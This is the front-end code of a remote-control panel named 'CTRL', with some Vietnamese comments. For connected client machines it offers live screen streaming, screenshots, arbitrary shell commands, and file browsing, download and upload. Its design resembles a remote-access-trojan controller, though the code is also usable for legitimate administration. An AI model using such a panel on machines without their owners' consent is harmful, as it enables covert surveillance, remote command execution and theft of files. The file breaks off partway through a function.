<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<title>Admin Panel</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap');

:root {
  --bg:      #080b10;
  --surf:    #0d1117;
  --surf2:   #0a0f18;
  --border:  #1a2233;
  --accent:  #00e5ff;
  --red:     #ff3366;
  --green:   #00ff88;
  --yellow:  #ffbb00;
  --muted:   #3d4f66;
  --text:    #c9d8ef;
  --mono:    'JetBrains Mono', monospace;
  --sans:    'Syne', sans-serif;
  --ex-w:    380px;   /* explorer panel width */
}

* { box-sizing: border-box; margin: 0; padding: 0; }
body { background: var(--bg); color: var(--text); font-family: var(--mono); height: 100vh; display: flex; overflow: hidden; }

/* ══ SCROLLBAR ══════════════════════════════════════ */
::-webkit-scrollbar { width: 4px; height: 4px; }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

/* ══ SIDEBAR (client list) ══════════════════════════ */
.sidebar {
  width: 200px; min-width: 200px;
  background: var(--surf);
  border-right: 1px solid var(--border);
  display: flex; flex-direction: column;
}
.sidebar-hdr {
  padding: 16px 14px 12px;
  border-bottom: 1px solid var(--border);
}
.logo {
  font-family: var(--sans); font-weight: 800; font-size: 14px;
  color: var(--accent); display: flex; align-items: center; gap: 8px;
}
.logo-dot {
  width: 7px; height: 7px; background: var(--accent); border-radius: 50%;
  box-shadow: 0 0 7px var(--accent); animation: pulse 2s infinite;
}
@keyframes pulse { 50% { opacity: .4; transform: scale(.6); } }
.clients-lbl {
  font-size: 9px; color: var(--muted); letter-spacing: .12em;
  text-transform: uppercase; margin-top: 12px;
}
.client-list { flex: 1; overflow-y: auto; padding: 8px; }
.client-item {
  display: flex; align-items: center; gap: 8px;
  padding: 9px 10px; border-radius: 7px; cursor: pointer;
  border: 1px solid transparent; margin-bottom: 3px;
  transition: background .12s, border-color .12s;
  font-size: 13px; font-weight: 600;
}
.client-item:hover { background: #111a28; }
.client-item.active { background: #0a1929; border-color: var(--accent); }
.cdot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 5px var(--green); flex-shrink: 0; }
.no-clients { color: var(--muted); font-size: 11px; text-align: center; padding: 16px 0; }

/* ══ MAIN AREA ══════════════════════════════════════ */
.main { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }

/* ══ TOPBAR ═════════════════════════════════════════ */
.topbar {
  display: flex; align-items: center; gap: 7px;
  padding: 9px 12px;
  border-bottom: 1px solid var(--border);
  background: var(--surf); flex-shrink: 0; flex-wrap: wrap;
}
.btn {
  font-family: var(--mono); font-size: 11px; font-weight: 600;
  padding: 6px 12px; border: 1px solid var(--border); border-radius: 5px;
  cursor: pointer; background: transparent; color: var(--text);
  transition: all .12s; white-space: nowrap; letter-spacing: .03em;
}
.btn:hover { border-color: var(--accent); color: var(--accent); }
.btn.primary { background: var(--accent); border-color: var(--accent); color: #000; font-weight: 700; }
.btn.primary:hover { opacity: .85; }
.btn.active-stream { background: rgba(0,255,136,.1); border-color: var(--green); color: var(--green); }
.btn.files-active { border-color: var(--accent); color: var(--accent); background: rgba(0,229,255,.07); }
.divider { width: 1px; height: 18px; background: var(--border); margin: 0 1px; }
.cmd-input {
  font-family: var(--mono); font-size: 12px;
  background: #0a1120; border: 1px solid var(--border); border-radius: 5px;
  padding: 6px 10px; color: var(--text); outline: none; flex: 1; max-width: 300px;
  transition: border .12s;
}
.cmd-input:focus { border-color: var(--accent); }
.cmd-input::placeholder { color: var(--muted); }
.stat-badge {
  background: #0d1a2a; border: 1px solid var(--border); border-radius: 4px;
  padding: 3px 9px; font-size: 11px; font-weight: 600; min-width: 60px;
  text-align: center; color: var(--muted); transition: color .3s, border-color .3s;
}
.stat-badge.good { color: var(--green); border-color: rgba(0,255,136,.3); }
.stat-badge.mid  { color: var(--yellow); border-color: rgba(255,187,0,.3); }
.stat-badge.low  { color: var(--red); border-color: rgba(255,51,102,.3); }
.status-pill { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--muted); margin-left: auto; }
.sdot { width: 6px; height: 6px; border-radius: 50%; background: var(--muted); }
.sdot.on { background: var(--green); box-shadow: 0 0 5px var(--green); }
.btn-logout { background: transparent; border: 1px solid var(--border); color: var(--muted); font-size: 11px; padding: 6px 12px; border-radius: 5px; cursor: pointer; transition: all .12s; font-family: var(--mono); font-weight: 600; margin-left: 8px; }
.btn-logout:hover { border-color: var(--red); color: var(--red); }

/* ══ WORKSPACE (viewer + explorer side by side) ══════ */
.workspace { flex: 1; display: flex; overflow: hidden; }

/* ══ VIEWER ═════════════════════════════════════════ */
.viewer {
  flex: 1; background: #04070d; display: flex;
  align-items: center; justify-content: center;
  position: relative; overflow: hidden; min-width: 0;
}
.screen-img { max-width: 100%; max-height: 100%; object-fit: contain; display: none; border-radius: 3px; }
.screen-img.show { display: block; }
.placeholder { display: flex; flex-direction: column; align-items: center; gap: 12px; color: var(--muted); }
.ph-icon { font-size: 40px; opacity: .22; }
.ph-text { font-family: var(--sans); font-size: 12px; letter-spacing: .06em; }
.live-badge {
  position: absolute; top: 10px; left: 10px; display: none;
  align-items: center; gap: 5px;
  background: rgba(0,0,0,.65); border: 1px solid rgba(0,255,136,.35);
  border-radius: 20px; padding: 3px 10px 3px 7px;
  font-size: 11px; color: var(--green); font-weight: 700; letter-spacing: .08em;
  backdrop-filter: blur(6px);
}
.live-badge.show { display: flex; }
.rec { width: 6px; height: 6px; background: var(--green); border-radius: 50%; animation: blink 1s step-end infinite; }
@keyframes blink { 50% { opacity: 0; } }

/* ══ EXPLORER PANEL (VS Code style) ═════════════════ */
.explorer-panel {
  width: 0; min-width: 0; overflow: hidden;
  background: var(--surf);
  border-left: 1px solid transparent;
  display: flex; flex-direction: column;
  transition: width .22s cubic-bezier(.4,0,.2,1), border-color .22s;
}
.explorer-panel.open {
  width: var(--ex-w); min-width: var(--ex-w);
  border-left-color: var(--border);
}

/* Explorer header */
.ex-hdr {
  display: flex; align-items: center; justify-content: space-between;
  padding: 10px 12px;
  border-bottom: 1px solid var(--border);
  flex-shrink: 0; background: var(--surf2);
}
.ex-title {
  font-family: var(--sans); font-weight: 800; font-size: 11px;
  color: var(--muted); letter-spacing: .14em; text-transform: uppercase;
}
.ex-hdr-btns { display: flex; gap: 4px; }
.ex-icon-btn {
  background: none; border: none; color: var(--muted); cursor: pointer;
  padding: 3px 6px; border-radius: 4px; font-size: 14px; line-height: 1;
  transition: color .12s, background .12s;
}
.ex-icon-btn:hover { color: var(--text); background: #1a2233; }

/* Path bar */
.ex-pathbar {
  display: flex; align-items: center; gap: 0;
  border-bottom: 1px solid var(--border); flex-shrink: 0;
  background: var(--surf2);
}
.ex-back {
  padding: 7px 10px; color: var(--muted); cursor: pointer;
  font-size: 13px; border-right: 1px solid var(--border);
  transition: color .12s; flex-shrink: 0;
}
.ex-back:hover { color: var(--accent); }
.ex-path-input {
  flex: 1; background: none; border: none; outline: none;
  color: var(--text); font-family: var(--mono); font-size: 11px;
  padding: 7px 10px; min-width: 0;
}
.ex-path-input::placeholder { color: var(--muted); }
.ex-refresh { padding: 7px 10px; color: var(--muted); cursor: pointer; font-size: 13px; transition: color .12s; }
.ex-refresh:hover { color: var(--accent); }

/* Drives bar */
.ex-drives {
  display: flex; gap: 4px; padding: 6px 10px; flex-wrap: wrap;
  border-bottom: 1px solid var(--border); flex-shrink: 0;
}
.ex-drive-pill {
  font-size: 10px; font-weight: 600; padding: 3px 9px;
  border: 1px solid var(--border); border-radius: 12px; cursor: pointer;
  color: var(--muted); background: transparent; font-family: var(--mono);
  transition: all .12s;
}
.ex-drive-pill:hover { border-color: var(--accent); color: var(--accent); }

/* Toolbar */
.ex-toolbar {
  display: flex; align-items: center; gap: 6px; padding: 6px 10px;
  border-bottom: 1px solid var(--border); flex-shrink: 0;
}
.ex-btn {
  font-family: var(--mono); font-size: 10px; font-weight: 600;
  padding: 4px 10px; border: 1px solid var(--border); border-radius: 4px;
  cursor: pointer; background: transparent; color: var(--text); white-space: nowrap;
  transition: all .12s;
}
.ex-btn:hover { border-color: var(--accent); color: var(--accent); }
.ex-btn.primary { background: var(--accent); border-color: var(--accent); color: #000; }
.ex-btn.primary:hover { opacity: .85; }
.ex-btn:disabled { opacity: .3; pointer-events: none; }
.ex-sel-info { font-size: 10px; color: var(--muted); margin-left: auto; white-space: nowrap; }

/* File list */
.ex-filelist { flex: 1; overflow-y: auto; }

.ex-row {
  display: flex; align-items: center; gap: 0;
  padding: 0; cursor: pointer;
  border-left: 2px solid transparent;
  transition: background .1s;
  user-select: none;
}
.ex-row:hover { background: #111a28; }
.ex-row.selected { background: #0a1929; border-left-color: var(--accent); }
.ex-row.active-dir { background: rgba(0,229,255,.05); }

.ex-row-icon { width: 32px; text-align: center; font-size: 14px; flex-shrink: 0; padding: 6px 0; }
.ex-row-name {
  flex: 1; font-size: 12px; padding: 6px 6px 6px 0;
  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; min-width: 0;
}
.ex-row-name.dir  { color: var(--accent); }
.ex-row-name.parent { color: var(--muted); font-style: italic; }
.ex-row-size { font-size: 10px; color: var(--muted); padding: 6px 10px 6px 6px; white-space: nowrap; flex-shrink: 0; }

/* Transfer queue */
.ex-transfers {
  flex-shrink: 0; max-height: 200px; overflow-y: auto;
  border-top: 1px solid var(--border);
  background: var(--surf2);
}
.ex-transfer-hdr {
  font-size: 9px; text-transform: uppercase; letter-spacing: .12em;
  color: var(--muted); padding: 8px 12px 4px;
}
.transfer-item {
  padding: 8px 12px; border-bottom: 1px solid rgba(26,34,51,.5);
  font-size: 11px;
}
.t-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
.t-name { font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 200px; }
.t-size { color: var(--muted); font-size: 10px; flex-shrink: 0; }
.t-bar { height: 3px; background: var(--border); border-radius: 2px; overflow: hidden; margin-bottom: 4px; }
.t-fill { height: 100%; border-radius: 2px; transition: width .2s; background: var(--accent); width: 0%; }
.t-fill.done { background: var(--green); }
.t-fill.err  { background: var(--red); }
.t-status { display: flex; justify-content: space-between; align-items: center; }
.t-msg { font-size: 10px; color: var(--muted); }
.t-dl { font-size: 10px; font-weight: 700; color: var(--accent); text-decoration: none; display: none; }
.t-dl.show { display: inline; }
.t-dl:hover { text-decoration: underline; }
.no-transfers { font-size: 11px; color: var(--muted); text-align: center; padding: 12px; }

/* Loading spinner */
.ex-loading { display: flex; align-items: center; justify-content: center; padding: 30px; gap: 10px; color: var(--muted); font-size: 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.spinner { border: 2px solid var(--border); border-top-color: var(--accent); border-radius: 50%; width: 14px; height: 14px; animation: spin .7s linear infinite; flex-shrink: 0; }

/* Drop overlay */
.drop-overlay {
  display: none; position: absolute; inset: 0;
  background: rgba(0,229,255,.08);
  border: 2px dashed var(--accent);
  border-radius: 4px; z-index: 10;
  align-items: center; justify-content: center;
  font-size: 14px; color: var(--accent); font-weight: 700;
  pointer-events: none;
}
.drop-overlay.show { display: flex; }

/* ══ OUTPUT LOG ═════════════════════════════════════ */
.output-panel {
  height: 130px; background: var(--surf);
  border-top: 1px solid var(--border);
  padding: 8px 12px; overflow-y: auto;
  font-size: 11px; line-height: 1.65; flex-shrink: 0;
}
.log { color: #4a6a8a; }
.log.info   { color: var(--accent); }
.log.result { color: var(--green); }
.log.error  { color: var(--red); }
.log.ts     { color: var(--muted); font-size: 9px; margin-bottom: 1px; }
</style>
</head>
<body>

<!-- ══ CLIENT SIDEBAR ══════════════════════════════════ -->
<div class="sidebar">
  <div class="sidebar-hdr">
    <div class="logo"><span class="logo-dot"></span>CTRL</div>
    <div class="clients-lbl">Online Clients</div>
  </div>
  <div class="client-list" id="clientList">
    <div class="no-clients">No clients online</div>
  </div>
</div>

<!-- ══ MAIN ════════════════════════════════════════════ -->
<div class="main">

  <!-- TOPBAR -->
  <div class="topbar">
    <button class="btn primary" id="streamBtn" onclick="toggleStream()">▶ Stream</button>
    <button class="btn" onclick="reqScreenshot()">⎙ Snap</button>
    <div class="divider"></div>
    <input class="cmd-input" id="cmdInput" placeholder="Shell command…" onkeydown="if(event.key==='Enter')sendCmd()">
    <button class="btn" onclick="sendCmd()">Run</button>
    <div class="divider"></div>
    <button class="btn" id="filesBtn" onclick="toggleExplorer()">📁 Files</button>
    <div class="divider"></div>
    <div class="stat-badge" id="fpsBadge">-- FPS</div>
    <div class="stat-badge" id="latBadge">-- ms</div>
    <div class="status-pill">
      <div class="sdot" id="sdot"></div>
      <span id="stxt">Connecting…</span>
    </div>
    <button class="btn-logout" onclick="window.location.href='/logout'">🚪 Logout</button>
  </div>

  <!-- WORKSPACE -->
  <div class="workspace">

    <!-- VIEWER -->
    <div class="viewer" id="viewer"
         ondragover="onViewerDragOver(event)"
         ondragleave="onViewerDragLeave(event)"
         ondrop="onViewerDrop(event)">
      <div class="placeholder" id="placeholder">
        <div class="ph-icon">🖥</div>
        <div class="ph-text">Select a client to begin</div>
      </div>
      <img class="screen-img" id="screenImg" alt="">
      <div class="live-badge" id="liveBadge"><div class="rec"></div>LIVE</div>
      <div class="drop-overlay" id="dropOverlay">Drop file to upload here</div>
    </div>

    <!-- ══ EXPLORER PANEL ══════════════════════════════ -->
    <div class="explorer-panel" id="explorerPanel">

      <!-- Header -->
      <div class="ex-hdr">
        <div class="ex-title">Explorer</div>
        <div class="ex-hdr-btns">
          <button class="ex-icon-btn" title="Upload file" onclick="document.getElementById('uploadInput').click()">↑</button>
          <button class="ex-icon-btn" title="Close" onclick="toggleExplorer()">✕</button>
        </div>
      </div>
      <input type="file" id="uploadInput" style="display:none" multiple onchange="uploadFiles(event)">

      <!-- Path bar -->
      <div class="ex-pathbar">
        <div class="ex-back" onclick="navBack()" title="Back">←</div>
        <input class="ex-path-input" id="exPath" placeholder="Path…" onkeydown="if(event.key==='Enter')navTo(this.value)">
        <div class="ex-refresh" onclick="navTo(exCurPath)" title="Refresh">↺</div>
      </div>

      <!-- Drives -->
      <div class="ex-drives" id="exDrives"></div>

      <!-- Toolbar -->
      <div class="ex-toolbar">
        <button class="ex-btn primary" id="exDlBtn" disabled onclick="downloadSelected()">↓ Download</button>
        <button class="ex-btn" onclick="document.getElementById('uploadInput').click()">↑ Upload</button>
        <span class="ex-sel-info" id="exSelInfo">–</span>
      </div>

      <!-- File list -->
      <div class="ex-filelist" id="exFilelist" style="position:relative">
        <div class="ex-loading"><div class="spinner"></div>Waiting for client…</div>
      </div>

      <!-- Transfer queue -->
      <div class="ex-transfers" id="exTransfers">
        <div class="ex-transfer-hdr">Transfers</div>
        <div class="no-transfers" id="noTransfers">No active transfers</div>
      </div>

    </div><!-- /explorer-panel -->

  </div><!-- /workspace -->

  <!-- OUTPUT LOG -->
  <div class="output-panel" id="output">
    <div class="log info">[SYSTEM] Panel ready</div>
  </div>

</div><!-- /main -->

<script>
// ════════════════════════════════════════════════════════════
//  STATE
// ════════════════════════════════════════════════════════════
let selClient    = null;
let isStreaming  = false;
let frameCount   = 0;
let fpsTimer     = null;
let lastFrameTs  = 0;
let exOpen       = false;
let exCurPath    = '.';
let exHistory    = [];
let exSelected   = new Set();
let exItems      = [];
let activeXfers  = {};       // tid → { el, fill, msg, dl, chunks, total }
const CHUNK      = 512*1024; // 512KB

// ════════════════════════════════════════════════════════════
//  WEBSOCKET
// ════════════════════════════════════════════════════════════
const ws = new WebSocket(
  (location.protocol==='https:'?'wss:':'ws:') + '//' + location.host + '/ws/admin'
);

const $sdot   = document.getElementById('sdot');
const $stxt   = document.getElementById('stxt');
const $stream = document.getElementById('streamBtn');
const $live   = document.getElementById('liveBadge');
const $fps    = document.getElementById('fpsBadge');
const $lat    = document.getElementById('latBadge');
const $img    = document.getElementById('screenImg');
const $ph     = document.getElementById('placeholder');
const $out    = document.getElementById('output');

ws.onopen = () => { $sdot.classList.add('on'); $stxt.textContent='Connected'; log('Connected','info'); };
ws.onclose= () => { $sdot.classList.remove('on'); $stxt.textContent='Disconnected'; _stopStream(false); log('Disconnected','error'); };

ws.onmessage = ({data}) => {
  let msg; try { msg=JSON.parse(data); } catch { return; }
  const {type, client_id} = msg;

  if (type==='clients')         { renderClients(msg.clients); return; }
  if (type==='client_info' && client_id===selClient) {
    const s=msg.sysinfo||{}; log(`[#${client_id}] ${s.platform} CPU:${s.cpu_percent}% RAM:${s.memory_percent}%`,'info'); return;
  }
  if (type==='stream_frame' && client_id===selClient) {
    const now=performance.now();
    if(lastFrameTs) $lat.textContent=Math.round(now-lastFrameTs)+'ms';
    lastFrameTs=now; frameCount++;
    $img.src='data:image/jpeg;base64,'+msg.image; showScreen(); return;
  }
  if (type==='screenshot' && client_id===selClient) {
    $img.src='data:image/jpeg;base64,'+msg.image; showScreen(); log(`Snapshot received`,'info'); return;
  }
  if (type==='command_result' && client_id===selClient) { log(msg.output,'result'); return; }
  if (type==='stream_stopped'  && client_id===selClient) { _stopStream(false); log(`Stream stopped: ${msg.reason}`,'error'); return; }

  // ── Explorer ─────────────────────────────────────────────
  if (type==='directory_list') { renderDir(msg.data); return; }
  if (type==='drives_list')    { renderDrives(msg.data); return; }

  // ── File transfers ────────────────────────────────────────
  if (type==='folder_transfer_start') { onFolderStart(msg); return; }
  if (type==='folder_transfer_done')  { onFolderDone(msg);  return; }
  if (type==='file_transfer_start')   { onXferStart(msg);   return; }
  if (type==='file_chunk')            { onXferChunk(msg);   return; }
  if (type==='file_transfer_done')    { onXferDone(msg);    return; }
  if (type==='file_transfer_error')   { onXferError(msg);   return; }
  if (type==='file_transfer_progress'){ onXferProgress(msg);return; }
  if (type==='file_save_result')      { onSaveResult(msg);  return; }
};

// ════════════════════════════════════════════════════════════
//  CLIENTS
// ════════════════════════════════════════════════════════════
function renderClients(clients) {
  const el = document.getElementById('clientList');
  if (!clients.length) {
    el.innerHTML='<div class="no-clients">No clients online</div>';
    if (selClient && !clients.includes(selClient)) { selClient=null; _stopStream(false); hideScreen(); }
    return;
  }
  el.innerHTML='';
  clients.forEach(id => {
    const d=document.createElement('div');
    d.className='client-item'+(id===selClient?' active':'');
    d.innerHTML=`<div class="cdot"></div>#${id}`;
    d.onclick=()=>selectClient(id);
    el.appendChild(d);
  });
}

function selectClient(id) {
  if(id===selClient) return;
  if(isStreaming && selClient) ws.send(JSON.stringify({type:'stop_stream',client_id:selClient}));
  isStreaming=false;
  selClient=id;
  document.querySelectorAll('.client-item').forEach(e=>e.classList.toggle('active',e.textContent.trim()==='#'+id));
  log(`[#${id}] Selected`,'info');
  if(exOpen) { reqDrives(); navTo('.'); }
  startStream();
}

// ════════════════════════════════════════════════════════════
//  STREAM
// ════════════════════════════════════════════════════════════
function toggleStream() { isStreaming ? _stopStream(true) : startStream(); }

function startStream() {
  if(!selClient||isStreaming) return;
  ws.send(JSON.stringify({type:'start_stream',client_id:selClient}));
  isStreaming=true; frameCount=0; lastFrameTs=0;
  $stream.textContent='⏹ Stop'; $stream.className='btn active-stream';
  $live.classList.add('show');
  fpsTimer=setInterval(()=>{
    const f=frameCount; frameCount=0;
    $fps.textContent=f+' FPS';
    $fps.className='stat-badge '+(f>=15?'good':f>=8?'mid':'low');
  },1000);
  log(`[STREAM] → #${selClient}`,'info');
}

function _stopStream(send) {
  if(send && selClient) try{ws.send(JSON.stringify({type:'stop_stream',client_id:selClient}));}catch{}
  isStreaming=false; clearInterval(fpsTimer); fpsTimer=null; frameCount=0;
  $stream.textContent='▶ Stream'; $stream.className='btn primary';
  $live.classList.remove('show');
  $fps.textContent='-- FPS'; $fps.className='stat-badge';
  $lat.textContent='-- ms';
}

function reqScreenshot() {
  if(!selClient){log('Select a client','error');return;}
  ws.send(JSON.stringify({type:'request_screenshot',client_id:selClient}));
}

function sendCmd() {
  if(!selClient){log('Select a client','error');return;}
  const v=document.getElementById('cmdInput').value.trim(); if(!v) return;
  ws.send(JSON.stringify({type:'command',client_id:selClient,command:v}));
  log('$ '+v,'log');
  document.getElementById('cmdInput').value='';
}

function showScreen() { $img.classList.add('show'); $ph.style.display='none'; }
function hideScreen() { $img.classList.remove('show'); $ph.style.display='flex'; }

// ════════════════════════════════════════════════════════════
//  EXPLORER PANEL
// ════════════════════════════════════════════════════════════
function toggleExplorer() {
  exOpen=!exOpen;
  document.getElementById('explorerPanel').classList.toggle('open',exOpen);
  document.getElementById('filesBtn').classList.toggle('files-active',exOpen);
  if(exOpen && selClient) { reqDrives(); navTo(exCurPath); }
}

function reqDrives() {
  if(!selClient) return;
  ws.send(JSON.stringify({type:'get_drives',client_id:selClient}));
}

function navTo(path) {
  if(!selClient) return;
  if(path!==exCurPath) exHistory.push(exCurPath);
  exCurPath=path;
  exSelected.clear(); updateSel();
  document.getElementById('exPath').value=path;
  document.getElementById('exFilelist').innerHTML='<div class="ex-loading"><div class="spinner"></div>Loading…</div>';
  ws.send(JSON.stringify({type:'list_directory',client_id:selClient,path}));
}

function navBack() { if(exHistory.length) navTo(exHistory.pop()); }

function renderDrives(drives=[]) {
  document.getElementById('exDrives').innerHTML = drives.map(d=>
    `<button class="ex-drive-pill" onclick="navTo('${esc(d.path)}')">${d.name}</button>`
  ).join('');
}

function renderDir(data) {
  if(!data) return;
  const items = data.items || [];
  const path  = data.path  || exCurPath;
  exCurPath=path; exItems=items;
  exSelected.clear(); updateSel();
  document.getElementById('exPath').value=path;

  if(data.error) {
    document.getElementById('exFilelist').innerHTML=
      `<div style="color:var(--red);padding:16px;font-size:12px">⚠ ${data.error}</div>`;
    return;
  }

  const rows = items.map(item => {
    const isDir   = item.type==='dir';
    const isPar   = item.type==='parent';
    const icon    = isPar?'↩':isDir?'📁':fileIcon(item.ext||'');
    const nc      = isPar?'parent':isDir?'dir':'';
    const size    = isPar?'':isDir?`${item.size} items`:fmtSize(item.size);
    return `<div class="ex-row" data-path="${esc(item.path)}" data-type="${item.type}"
               ondblclick="rowDbl(this)" onclick="rowClick(this,event)">
      <div class="ex-row-icon">${icon}</div>
      <div class="ex-row-name ${nc}" title="${esc(item.name)}">${esc(item.name)}</div>
      <div class="ex-row-size">${size}</div>
    </div>`;
  }).join('');

  document.getElementById('exFilelist').innerHTML = rows ||
    '<div style="color:var(--muted);padding:20px;font-size:12px;text-align:center">Empty folder</div>';
}

function rowDbl(el) {
  const {type, path} = el.dataset;
  if(type==='dir'||type==='parent') navTo(path);
  else { exSelected.clear(); exSelected.add(path); updateSel(); downloadSelected(); }
}

function rowClick(el, e) {
  const {path, type} = el.dataset;
  if(type==='parent') return;
  if(e.ctrlKey||e.metaKey) { exSelected.has(path)?exSelected.delete(path):exSelected.add(path); }
  else if(e.shiftKey && exSelected.size) {
    const rows=[...document.querySelectorAll('.ex-row')];
    const a=rows.indexOf(el), b=rows.findIndex(r=>exSelected.has(r.dataset.path));
    for(let i=Math.min(a,b);i<=Math.max(a,b);i++) if(rows[i].dataset.path) exSelected.add(rows[i].dataset.path);
  } else { exSelected.clear(); exSelected.add(path); }
  document.querySelectorAll('.ex-row').forEach(r=>r.classList.toggle('selected',exSelected.has(r.dataset.path)));
  updateSel();
}

function updateSel() {
  const n=exSelected.size;
  document.getElementById('exSelInfo').textContent=n?`${n} selected`:'–';
  document.getElementById('exDlBtn').disabled=!n;
}

// ── Download: Client → Admin ───────────────────────────────
function downloadSelected() {
  if(!exSelected.size||!selClient) return;
  exSelected.forEach(path=>{
    const tid=randId();
    const name=path.split(/[\\/]/).pop();
    mkXferItem(tid, name, null, 'down');
    ws.send(JSON.stringify({type:'request_file_upload',client_id:selClient,path,transfer_id:tid}));
    log(`↓ Fetching: ${path}`,'info');
  });
}

// ── Upload: Admin → Client (into current explorer dir) ─────
async function uploadFiles(e) {
  const files=[...e.target.files]; e.target.value='';
  if(!files.length||!selClient) return;
  for(const file of files) await sendOneFile(file, exCurPath);
}

async function sendOneFile(file, saveDir) {
  const tid=randId();
  const total=Math.ceil(file.size/CHUNK)||1;
  mkXferItem(tid, file.name, file.size, 'up');
  ws.send(JSON.stringify({type:'send_file_to_client',client_id:selClient,transfer_id:tid,
    filename:file.name,file_size:file.size,total_chunks:total,save_dir:saveDir}));
  for(let i=0;i<total;i++){
    const b64=await readB64(file.slice(i*CHUNK,(i+1)*CHUNK));
    ws.send(JSON.stringify({type:'send_chunk_to_client',client_id:selClient,transfer_id:tid,
      chunk_idx:i,total_chunks:total,data:b64}));
    xferProgress(tid,i+1,total);
    await tick();
  }
  ws.send(JSON.stringify({type:'finish_file_to_client',client_id:selClient,transfer_id:tid,
    filename:file.name,file_size:file.size}));
  log(`↑ Sent: ${file.name} → ${saveDir}`,'info');
}

// ── Drag & drop onto viewer → upload to current dir ─────────
function onViewerDragOver(e) {
  if(!exOpen||!selClient) return;
  e.preventDefault();
  document.getElementById('dropOverlay').classList.add('show');
  document.getElementById('dropOverlay').textContent=`Drop to upload → ${exCurPath}`;
}
function onViewerDragLeave() { document.getElementById('dropOverlay').classList.remove('show'); }
function onViewerDrop(e) {
  e.preventDefault();
  document.getElementById('dropOverlay').classList.remove('show');
  if(!exOpen||!selClient) return;
  [...(e.dataTransfer.files||[])].forEach(f=>sendOneFile(f,exCurPath));
}

// ════════════════════════════════════════════════════════════
//  TRANSFER HANDLERS (incoming from server)
// ════════════════════════════════════════════════════════════
function onFolderStart(msg) {
  // folder_transfer_start — tạo 1 item đại diện cho cả folder
  const {transfer_id:tid, folder_name, total_files} = msg;
  mkXferItem(tid, `📁 ${folder_name}/`, null, 'down', `0/${total_files} files`);
}

function onFolderDone(msg) {
  const {transfer_id:tid, folder_name, total_files} = msg;
  const x=activeXfers[tid];
  if(!x) return;
  setXferDone(tid);
  x.msg.textContent=`${total_files} files received`;
  // Tạo download link cho folder — chỉ available qua server endpoint
  x.dl.href=`/download_folder/${tid}`;
  x.dl.textContent='⬇ Download zip';
  x.dl.classList.add('show');
  log(`↓ Folder done: ${folder_name} (${total_files} files)`,'result');
  // Refresh explorer nếu đang mở
  if(exOpen) setTimeout(()=>navTo(exCurPath), 800);
}

function onXferStart(msg) {
  const {transfer_id:tid, filename, file_size, total_chunks, total_files, file_index, is_folder} = msg;
  if(is_folder && activeXfers[tid]) {
    // Cập nhật progress item folder đã có
    const x=activeXfers[tid];
    const fi=file_index+1;
    x.msg.textContent=`[${fi}/${total_files}] ${filename.split(/[\\/]/).pop()}`;
    x.fill.style.width='0%';
    // track chunk state riêng cho file hiện tại
    x.curChunks=0; x.curTotal=total_chunks;
    return;
  }
  // File đơn
  if(!activeXfers[tid]) mkXferItem(tid, filename, file_size, 'down');
  const x=activeXfers[tid];
  if(x){ x.total=total_chunks; x.chunks=0; }
}

function onXferChunk(msg) {
  const {transfer_id:tid, chunk_idx, total_chunks} = msg;
  const x=activeXfers[tid]; if(!x) return;
  if(x.curTotal!=null) {
    // folder mode: progress per file
    x.curChunks=(x.curChunks||0)+1;
    xferProgress(tid, x.curChunks, x.curTotal);
  } else {
    x.chunks=(x.chunks||0)+1;
    xferProgress(tid, x.chunks, x.total||total_chunks);
  }
}

function onXferDone(msg) {
  const {transfer_id:tid, filename, file_index, total_files, is_folder} = msg;
  if(is_folder) return; // folder done xử lý bởi onFolderDone
  setXferDone(tid);
  const x=activeXfers[tid]; if(!x) return;
  x.dl.href=`/download/${tid}`;
  x.dl.textContent='⬇ Download';
  x.dl.classList.add('show');
  log(`↓ Ready: ${filename}`,'result');
}

function onXferError(msg) {
  const {transfer_id:tid, error} = msg;
  const x=activeXfers[tid]; if(!x) return;
  x.fill.classList.add('err'); x.fill.style.width='100%';
  x.msg.textContent='✕ '+error;
  x.msg.style.color='var(--red)';
  log(`Transfer error: ${error}`,'error');
}

function onXferProgress(msg) {
  const {transfer_id:tid} = msg;
  const x=activeXfers[tid]; if(!x) return;
  x.msg.textContent=msg.message||'…';
}

function onSaveResult(msg) {
  const {transfer_id:tid, path, error} = msg;
  const x=activeXfers[tid];
  if(x){ if(error){x.fill.classList.add('err');x.msg.textContent='✕ '+error;}else{setXferDone(tid);x.msg.textContent='Saved: '+path;} }
  if(error) log(`Save error: ${error}`,'error');
  else { log(`↑ Saved: ${path}`,'result'); if(exOpen) setTimeout(()=>navTo(exCurPath),600); }
}

// ════════════════════════════════════════════════════════════
//  TRANSFER UI HELPERS
// ════════════════════════════════════════════════════════════
function mkXferItem(tid, name, size, dir, initMsg='') {
  document.getElementById('noTransfers')?.remove();
  const el=document.createElement('div'); el.className='transfer-item'; el.id='xfer-'+tid;
  el.innerHTML=`
    <div class="t-row">
      <span class="t-name" title="${esc(name)}">${dir==='up'?'↑':'↓'} ${esc(name)}</span>
      <span class="t-size">${size!=null?fmtSize(size):''}</span>
    </div>
    <div class="t-bar"><div class="t-fill" id="fill-${tid}"></div></div>
    <div class="t-status">
      <span class="t-msg" id="msg-${tid}">${initMsg||'Starting…'}</span>
      <a class="t-dl" id="dl-${tid}" target="_blank"></a>
    </div>`;
  document.getElementById('exTransfers').appendChild(el);
  activeXfers[tid]={
    el, fill:document.getElementById('fill-'+tid),
    msg:document.getElementById('msg-'+tid),
    dl:document.getElementById('dl-'+tid),
    chunks:0, total:0
  };
}

function xferProgress(tid, done, total) {
  const x=activeXfers[tid]; if(!x||!total) return;
  const pct=Math.round(done/total*100);
  x.fill.style.width=pct+'%';
  if(!x.curTotal) x.msg.textContent=pct+'%'; // solo file
}

function setXferDone(tid) {
  const x=activeXfers[tid]; if(!x) return;
  x.fill.style.width='100%'; x.fill.classList.add('done');
}

// ════════════════════════════════════════════════════════════
//  UTILS
// ════════════════════════════════════════════════════════════
function fileIcon(ext) {
  const m={
    '.exe':'⚙','.dll':'⚙','.bat':'⚙','.sh':'⚙',
